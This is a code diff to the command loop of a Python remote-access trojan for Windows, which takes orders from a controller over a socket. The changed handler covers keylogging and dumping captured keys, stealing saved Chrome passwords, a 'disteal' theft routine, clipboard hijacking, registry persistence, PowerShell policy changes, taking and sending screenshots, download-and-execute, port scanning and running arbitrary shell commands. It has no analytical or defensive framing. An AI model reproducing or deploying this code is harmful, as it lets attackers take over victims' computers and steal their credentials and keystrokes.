@@ -583,7 +583,7 @@ def download_file(file_name):
 
 
 def upload_file(file_name):
-    if isfile(file_name) == True:
+    if isfile(file_name) == True  :
 
         f = open(file_name, 'rb')
         s.send(f.read())
@@ -625,204 +625,211 @@ def connection():
 
 def shell():
     while True:
-        command = reliable_recv()
-        if command == 'quit':
-            break
-        elif command == 'help':
-            pass
-        elif command == 'clear':
-            pass
+        try:
+            command = reliable_recv()
+            if command == 'quit':
+                break
+            elif command == 'background':
+                pass
+            elif command == 'help':
+                pass
+            elif command == 'clear':
+                pass
 
+            elif command[:2] == 'cd':
+                try:
+                    os.chdir(command[3:])
+                    reliable_send('Changing Directory')
+                except:
+                    reliable_send('Directory Not Found')
+                    continue
+            elif command[:10] == 'cwallpaper':
+                reliable_send('changed wallpaper')
+                wallpaper()
 
-        elif command[:2] == 'cd':
-            try:
-                os.chdir(command[3:])
-                reliable_send('Changing Directory')
-            except:
-                reliable_send('Directory Not Found')
-                continue
-        elif command[:7] == 'appdata':
-            try:
-                reliable_send('Going to Roaming Dir')
-                os.chdir(os.getenv('appdata'))
-            except:
-                reliable_send('[-]Error')
+            elif command[:7] == 'appdata':
+                try:
+                    reliable_send('Going to Roaming Dir')
+                    os.chdir(os.getenv('appdata'))
+                except:
+                    reliable_send('[-]Error')
 
-        elif command[:6] == 'upload':
-            try:
-                download_file(command[7:])
-            except:
-                reliable_send('ERROR')
-                continue
-        elif command[:10] == 'cwallpaper':
-            reliable_send('changed wallpaper')
-            wallpaper()
-        elif command[:6] == 'pslist':
-            try:
-                getprocess()
-            except:
-                reliable_send('[-]ERROR')
-        elif command[:8] == 'download':
-            try:
-                upload_file(command[9:])
-            except:
-                reliable_send('ERROR')
-                continue
-        elif command[:12] == 'changepolicy':
-            reliable_send('you will be able now to run powershell script')
-            changeexecutionpolicy()
-        elif command[:15] == 'ssharescreen':
+            elif command[:6] == 'upload':
+                try:
+                    download_file(command[7:])
+                except:
+                    continue
+            elif command[:4] == 'kill':
+                killprocess(command[5:])
+            elif command[:8] == 'download':
+                try:
+                    upload_file(command[9:])
+                except:
+                    continue
+            elif command == 'back':
+                pass
+            elif command[:10] == 'screenshot':
+                screenshot()
+                upload_file(appd + '\\screen.png')
+                os.remove(appd + '\\screen.png')
+            elif command[:4] == 'priv':
+                try:
+                    isuac()
+                except:
+                    reliable_send('[-]ERROR')
+            elif command[:6] == 'pslist':
+                try:
+                    reliable_send(getprocess())
+                except:
+                    reliable_send('[-]ERROR')
+            elif command[:3] == 'say':
+                try:
+                    reliable_send('[+]Executed')
+                    say(command[4:])
+                except:
+                    reliable_send('[-] Error')
+                    continue
+            elif command[:5] == 'dexec':
+                downloadfilenet(command[6:])
 
-            stopscreenshare()
-        elif command[:11] == 'screenshare':
-            threading.Thread(target=screenshare())
-        elif command == 'ngroksetup':
-            download_file(appd + '\\systemsoft.exe')
-            reliable_send('[+] ngrok installed')
-        elif command[:10] == 'screenshot':
-            screenshot()
-            upload_file(appd+'\\screen.png')
-            os.remove(appd+'\\screen.png')
-        elif command[:4] == 'priv':
-            try:
-                isuac()
-            except:
-                reliable_send('[-]ERROR')
-        elif command[:3] == 'say':
-            try:
-                reliable_send('[+]Executed')
+            elif command[:5] == 'getip':
+                getip()
+            elif command[:9] == 'open_link':
+                url = command[10:]
 
-                say(command[4:])
-            except:
-                reliable_send('[-] Error')
-                continue
-        elif command[:5] == 'dexec':
-            downloadfilenet(command[6:])
+                try:
+                    op(url)
+                    reliable_send('[+]Opened Url')
+                except:
+                    reliable_send('[-]error')
+            elif command[:3] == 'pwd':
+                try:
+                    reliable_send('you are in ' + os.getcwd() + '\n')
+                except:
+                    reliable_send('GOT AN EROR')
+                    continue
+            elif command[:7] == 'getuser':
+                try:
+                    reliable_send('username is ' + getpass.getuser() + '\n')
+                except:
+                    reliable_send('error')
+                    continue
+            elif command[:6] == 'msgbox':
+                sp = command.split('|')
+                try:
+                    reliable_send('MsgBox Showed')
+                    Mbox(sp[1], sp[2], 1)
+                except:
+                    reliable_send('[-] ERROR')
+                    continue
+            elif command[:7] == 'run-pwr':
+                try:
 
-        elif command[:5] == 'getip':
-            getip()
-        elif command[:9] == 'open_link':
-            url = command[10:]
+                    pwr = os.popen('powershell -c ' + command[8:]).read()
+                    reliable_send('[+] Executed \n' + pwr)
+                except:
+                    reliable_send('[-]ERROR')
+                    continue
+            elif command[:12] == 'changepolicy':
+                reliable_send('Now you will be able now to run powershell script')
+                changeexecutionpolicy()
+            elif command[:15] == 'ssharescreen':
 
-            try:
-                op(url)
-                reliable_send('[+]Opened Url')
-            except:
-                reliable_send('[-]error')
-        elif command[:4] == 'kill':
-            killprocess(command[5:])
-        elif command[:3] == 'pwd':
-            try:
-                reliable_send('you are in ' + os.getcwd() + '\n')
-            except:
-                reliable_send('GOT AN EROR')
-                continue
-        elif command[:7] == 'sysinfo':
-            try:
-                sysinfo()
-            except:
-                reliable_send('[-]ERROR')
+                stopscreenshare()
+            elif command[:5] == 'start':
+                try:
+                    subprocess.Popen(command[6:], shell=True)
+                    reliable_send('\n [+] started \n')
+                except:
+                    reliable_send('\n [-] Failed \n')
+                    continue
+            elif command[:12] == 'keylog_start':
+                try:
+                    global t
+                    global keylog
+                    reliable_send('Starting keylogger')
+                    keylog = Keylogger()
+                    t = threading.Thread(target=keylog.start)
+                    t.start()
+
+                except:
+                    reliable_send('[-]ERROR')
+
+                    continue
+            elif command[:11] == 'keylog_stop':
+                try:
+                    keylog.self_destruct()
+                    t.join()
+                    reliable_send('[+] Keylogger Stopped!')
+                except:
+                    reliable_send('[-] keylogger not started')
+                    continue
+            elif command[:11] == 'keylog_dump':
+                try:
+                    keys = open(appd + '\\Sys64.dll', 'r').read()
+                    reliable_send(keys)
+                except:
+                    reliable_send('[-]ERROR')
+                    continue
+            elif command[:12] == 'chrome_recon':
+                try:
+                    recover = threading.Thread(target=chromepassword())
+                    recover.start()
+                    passwords = open(appd + '\\' + getpass.getuser() + '-Passwords.txt', 'r').read()
+                    reliable_send(passwords)
+                    os.remove(appd + '\\' + getpass.getuser() + '-Passwords.txt')
+                except:
+                    reliable_send('[-] ERROR')
+                    continue
+            elif command[:7] == 'disteal':
+                try:
+                    steal()
+                except:
+                    reliable_send('[-]ERROR')
+                    continue
+            elif command[:4] == 'clip':
+                try:
+                    changeclip(command[5:])
+                except:
+                    reliable_send('')
+                    continue
+
+            elif command[:11] == 'persistence':
+                reg_name, copy_name = command[12:].split(' ')
+                persist(reg_name, copy_name)
+            elif command[:7] == 'sendall':
+                try:
+                    reliable_send('Command Executed')
+                    subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                     stdin=subprocess.PIPE)
+                except:
+                    reliable_send('[-]Failed')
+            elif command[:6] == "isopen":
+                try:
+                    spl = command[7:].split(":")
+                    scanport(spl[0], int(spl[1]))
+                except:
+                    reliable_send('command should be like this isopen ip:port')
+            elif command[:11] == 'screenshare':
+                threading.Thread(target=screenshare())
+            elif command == 'ngroksetup':
+                download_file(appd + '\\systemsoft.exe')
+                reliable_send('[+] ngrok installed')
+            elif command[:7] == 'sysinfo':
+                try:
+                    sysinfo()
+                except:
+                    reliable_send('[-]error')
+                    continue
+            else:
+                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                           stdin=subprocess.PIPE)
+                result = execute.stdout.read() + execute.stderr.read()
+                result = result.decode()
+                reliable_send(result)
+        except UnicodeError:
+            reliable_send(os.listdir(os.getcwd()))
             continue
-        elif command[:7]== 'getuser':
-            try:
-                reliable_send('username is ' + getpass.getuser() + '\n')
-            except:
-                reliable_send('error')
-                continue
-        elif command[:6] == 'msgbox':
-            sp = command.split('|')
-            try:
-                reliable_send('MsgBox Showed')
-                Mbox(sp[1], sp[2], 1)
-            except:
-                reliable_send('[-] ERROR')
-                continue
-        elif command[:7] == 'run-pwr':
-            try:
-                reliable_send('[+] Executed \n')
-                pwr = os.popen('powershell -c ' + command[8:]).read()
-                reliable_send(pwr)
-            except:
-                reliable_send('[-]ERROR')
-                continue
-        elif command[:5] == 'start':
-            try:
-                subprocess.Popen(command[6:], shell=True)
-                reliable_send('\n [+] started \n')
-            except:
-                reliable_send('\n [-] Failed \n')
-                continue
-        elif command[:12] == 'keylog_start':
-            try:
-                reliable_send('Starting keylogger')
-                keylog = Keylogger()
-                t = threading.Thread(target=keylog.start)
-                t.start()
-
-            except:
-                reliable_send('[-]ERROR')
-                continue
-        elif command[:11] == 'keylog_stop':
-            try:
-                keylog.self_destruct()
-                t.join()
-                reliable_send('[+] Keylogger Stopped!')
-            except:
-                reliable_send('[-] keylogger not started')
-                continue
-        elif command[:11] == 'keylog_dump':
-            try:
-                keys = open(appd + '\\Sys64.dll', 'r').read()
-                reliable_send(keys)
-            except:
-                reliable_send('[-]ERROR')
-                continue
-        elif command[:12] == 'chrome_recon':
-            try:
-                recover = threading.Thread(target=chromepassword())
-                recover.start()
-                passwords = open(appd+'\\'+getpass.getuser()+'-Passwords.txt','r').read()
-                reliable_send(passwords)
-                os.remove(appd+'\\'+getpass.getuser()+'-Passwords.txt')
-            except:
-                reliable_send('[-] ERROR')
-                continue
-        elif command == 'back':
-            pass
-        elif command[:7] == 'disteal':
-            try:
-                steal()
-            except:
-                reliable_send('[-]ERROR')
-                continue
-        elif command[:4] == 'clip':
-            try:
-                changeclip(command[5:])
-            except:
-                reliable_send('')
-                continue
-
-        elif command[:11] == 'persistence':
-            reg_name, copy_name = command[12:].split(' ')
-            persist(reg_name, copy_name)
-        elif command[:6] == "isopen":
-            try:
-                spl = command[7:].split(":")
-                scanport(spl[0],int(spl[1]))
-            except:
-                reliable_send('command should be like this isopen ip:port')
-        elif command[:7] == 'sendall':
-            try:
-                reliable_send('Command Executed')
-                subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                 stdin=subprocess.PIPE)
-            except:
-                reliable_send('[-]Failed')
-        else:
-            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read()
-            result = result.decode()
-            reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 autopersist()
